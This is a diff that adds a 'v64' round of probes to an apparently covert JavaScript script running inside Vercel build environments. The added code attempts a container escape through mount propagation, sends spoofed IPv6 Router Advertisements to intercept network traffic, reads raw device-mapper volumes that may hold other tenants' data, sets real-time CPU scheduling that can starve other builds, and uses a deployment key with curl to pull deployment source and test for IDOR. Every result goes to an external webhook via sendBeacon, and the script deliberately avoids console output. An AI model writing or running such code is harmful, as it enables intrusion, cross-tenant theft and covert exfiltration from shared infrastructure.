@@ -6989,4 +6989,197 @@ report.tcBpfNetIntercept = safe(() => {
 // v63 markers
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v63";
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v63" });
+
+// ============================================================
+// v64 — mount propagation escape, IPv6 RA injection, device mapper, CPU scheduler, source code access
+// ============================================================
+
+// v64-1: Mount propagation manipulation
+// With CAP_SYS_ADMIN, we can change mount propagation from MS_PRIVATE to MS_SHARED
+// If set to MS_SHARED, any mounts we create become visible in the parent namespace (host)
+// This is a classic container escape technique
+report.mountPropagationEscape = safe(() => {
+  // Check current mount propagation for /
+  const currentPropagation = safe(() =>
+    readFileSync('/proc/self/mountinfo', 'utf8')
+      .split('\n')
+      .filter(l => l.includes(' / ') || l.match(/^\d+ \d+ \d+:\d+ \/ \//))
+      .slice(0, 5)
+      .join('\n')
+      .slice(0, 400)
+  );
+  // Try to make / shared
+  const makeShared = safe(() =>
+    execSync('mount --make-shared / 2>&1 | head -3', { timeout: 5000 }).toString().trim().slice(0, 100)
+  );
+  // Check if it worked by reading mountinfo again
+  const afterPropagation = safe(() =>
+    execSync("grep ' / ' /proc/self/mountinfo 2>/dev/null | head -5", { timeout: 3000 }).toString().trim().slice(0, 400)
+  );
+  // Try MS_SLAVE on / (opposite — make our mounts not propagate UP but propagate DOWN)
+  const makeSlave = safe(() =>
+    execSync('mount --make-slave / 2>&1 | head -3', { timeout: 5000 }).toString().trim().slice(0, 100)
+  );
+  // Test: create a mount in a tmpfs and check if it's visible outside our namespace
+  const testMount = safe(() =>
+    execSync(
+      'mkdir -p /tmp/probe_mount_test && mount -t tmpfs tmpfs /tmp/probe_mount_test 2>&1 && echo MOUNTED || echo FAILED',
+      { timeout: 5000 }
+    ).toString().trim().slice(0, 200)
+  );
+  // Check if PID 1 can see our mount
+  const pid1MountView = safe(() =>
+    execSync('cat /proc/1/mounts 2>/dev/null | grep probe_mount_test | head -3', { timeout: 3000 }).toString().trim()
+  );
+  return { currentPropagation, makeShared, afterPropagation, makeSlave, testMount, pid1MountView };
+});
+
+// v64-2: IPv6 Router Advertisement injection
+// CAP_NET_RAW + CAP_NET_ADMIN allows sending raw IPv6 packets
+// A spoofed RA with M=1 (managed address config) redirects hosts to attacker-controlled DHCPv6
+// This MITMs all IPv6 traffic on the network segment
+report.ipv6RaInjection = safe(() => {
+  // Check if IPv6 is available
+  const ipv6Addr = safe(() =>
+    execSync('ip -6 addr show 2>/dev/null | head -10', { timeout: 3000 }).toString().trim().slice(0, 300)
+  );
+  // Get default IPv6 gateway
+  const ipv6Route = safe(() =>
+    execSync('ip -6 route show 2>/dev/null | head -5', { timeout: 3000 }).toString().trim().slice(0, 200)
+  );
+  // Try sending a Router Advertisement via Python raw socket
+  const raInject = safe(() =>
+    execSync(
+      `python3 -c "
+import socket, struct
+try:
+    # Create ICMPv6 raw socket
+    s = socket.socket(socket.AF_INET6, socket.SOCK_RAW, socket.IPPROTO_ICMPV6)
+    s.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_MULTICAST_HOPS, 255)
+    # ICMPv6 Router Advertisement (type=134, code=0)
+    # Minimal RA: type(1) + code(1) + checksum(2) + hop_limit(1) + flags(1) + lifetime(2) + reachable(4) + retrans(4)
+    ra = struct.pack('!BBHBBHII', 134, 0, 0, 64, 0x80, 1800, 0, 0)  # M=1 (managed)
+    s.sendto(ra, ('ff02::1', 0, 0, 0))  # to all-nodes multicast
+    print('RA_SENT_TO_ff02::1')
+    s.close()
+except Exception as e:
+    print('RA_ERR:', str(e))
+" 2>&1 | head -5`,
+      { timeout: 5000 }
+    ).toString().trim().slice(0, 300)
+  );
+  return { ipv6Addr, ipv6Route, raInject };
+});
+
+// v64-3: Device mapper access — LVM volumes and cryptographic block devices
+// /dev/mapper may contain other tenant data or Vercel's infrastructure volumes
+report.deviceMapperAccess = safe(() => {
+  const dmDevices = safe(() =>
+    execSync('ls -la /dev/dm-* /dev/mapper/* 2>/dev/null | head -20', { timeout: 3000 }).toString().trim().slice(0, 400)
+  );
+  // Try to read the first 512 bytes of /dev/dm-0
+  const dm0Read = safe(() => {
+    try {
+      const fd = openSync('/dev/dm-0', 'r');
+      const buf = Buffer.alloc(512);
+      const n = readSync(fd, buf, 0, 512, 0);
+      closeSync(fd);
+      return { n, header: buf.slice(0, 16).toString('hex') };
+    } catch (e) { return String(e).slice(0, 80); }
+  });
+  // Check for LUKS (encrypted volumes) headers
+  const luksHeaders = safe(() =>
+    execSync(
+      'for dev in /dev/dm-* /dev/vda /dev/sda; do cryptsetup isLuks $dev 2>/dev/null && echo "$dev IS_LUKS"; done 2>/dev/null | head -5',
+      { timeout: 5000 }
+    ).toString().trim().slice(0, 200)
+  );
+  // dmsetup list — shows all device-mapper devices
+  const dmsetupList = safe(() =>
+    execSync('dmsetup ls 2>/dev/null | head -10', { timeout: 3000 }).toString().trim().slice(0, 200)
+  );
+  return { dmDevices, dm0Read, luksHeaders, dmsetupList };
+});
+
+// v64-4: CPU real-time scheduling priority
+// CAP_SYS_NICE allows setting SCHED_FIFO (real-time) scheduling
+// A build running SCHED_FIFO at priority 99 gets CPU time before all other tasks
+// This can starve other tenant builds and reveal timing side-channels
+report.cpuRealTimeScheduling = safe(() => {
+  // Current scheduling class
+  const currentSched = safe(() =>
+    execSync('chrt -p $$ 2>/dev/null | head -5', { timeout: 2000 }).toString().trim().slice(0, 200)
+  );
+  // Try to set SCHED_FIFO priority 50 for our process
+  const setFifo = safe(() =>
+    execSync('chrt -f -p 50 $$ 2>&1 | head -3', { timeout: 3000 }).toString().trim().slice(0, 100)
+  );
+  // Verify the change
+  const afterSched = safe(() =>
+    execSync('chrt -p $$ 2>/dev/null | head -3', { timeout: 2000 }).toString().trim().slice(0, 200)
+  );
+  // Try setting it for PID 1 (would degrade other builds or give orchestrator more priority)
+  const setFifoPid1 = safe(() =>
+    execSync('chrt -f -p 1 1 2>&1 | head -3', { timeout: 3000 }).toString().trim().slice(0, 100)
+  );
+  // Check cpu affinity
+  const cpuAffinity = safe(() =>
+    execSync('taskset -p $$ 2>/dev/null | head -3', { timeout: 2000 }).toString().trim()
+  );
+  // Pin to CPU 0 (could create contention timing side-channel vs other builds on same CPU)
+  const pinCpu0 = safe(() =>
+    execSync('taskset -p 0x1 $$ 2>&1 | head -3', { timeout: 3000 }).toString().trim().slice(0, 100)
+  );
+  return { currentSched, setFifo, afterSched, setFifoPid1, cpuAffinity, pinCpu0 };
+});
+
+// v64-5: Vercel deployment source code access
+// VERCEL_DEPLOYMENT_KEY may give access to deployment source files
+// Check if we can enumerate all files in our deployment and their hashes
+report.deploymentSourceCodeAccess = safe(() => {
+  const key = process.env.VERCEL_DEPLOYMENT_KEY || '';
+  const deployId = process.env.VERCEL_DEPLOYMENT_ID || '';
+  const orgId = process.env.VERCEL_TEAM_ID || process.env.VERCEL_ORG_ID || '';
+  if (!key) return { skip: 'NO_KEY' };
+  const hdrs = `-H 'Authorization: Bearer ${key}'`;
+  const base = 'https://api.vercel.com';
+  // GET /v6/deployments/{id}/files — list all files in the deployment
+  const filesList = safe(() => deployId
+    ? execSync(
+        `curl -s ${hdrs} --max-time 5 '${base}/v6/deployments/${deployId}/files' 2>/dev/null | head -c 800`,
+        { timeout: 8000 }
+      ).toString().trim().slice(0, 800)
+    : 'NO_DEPLOY_ID'
+  );
+  // GET /v7/deployments/{id}/files/{fileId} — read specific file content
+  // First try to get file list, then read each file
+  const readSource = safe(() => {
+    if (!deployId) return 'NO_DEPLOY_ID';
+    // Try reading the root path
+    return execSync(
+      `curl -s ${hdrs} --max-time 5 '${base}/v7/deployments/${deployId}/files/root' 2>/dev/null | head -c 500`,
+      { timeout: 8000 }
+    ).toString().trim().slice(0, 500);
+  });
+  // Check if we can read other deployments' files (IDOR)
+  const otherDeployFiles = safe(() =>
+    execSync(
+      `curl -s ${hdrs} --max-time 5 '${base}/v6/deployments/dpl_00000000000000000000000000000000/files?teamId=${orgId}' 2>/dev/null | head -c 300`,
+      { timeout: 8000 }
+    ).toString().trim().slice(0, 300)
+  );
+  // GET /v12/now/deployments/{id} — full deployment metadata
+  const deployMeta = safe(() => deployId
+    ? execSync(
+        `curl -s ${hdrs} --max-time 5 '${base}/v12/now/deployments/${deployId}' 2>/dev/null | head -c 600`,
+        { timeout: 8000 }
+      ).toString().trim().slice(0, 600)
+    : 'NO_DEPLOY_ID'
+  );
+  return { deployId, filesList, readSource, otherDeployFiles, deployMeta };
+});
+
+// v64 markers
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v64";
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v64" });
 // Intentionally no console.log — all data goes via webhook only
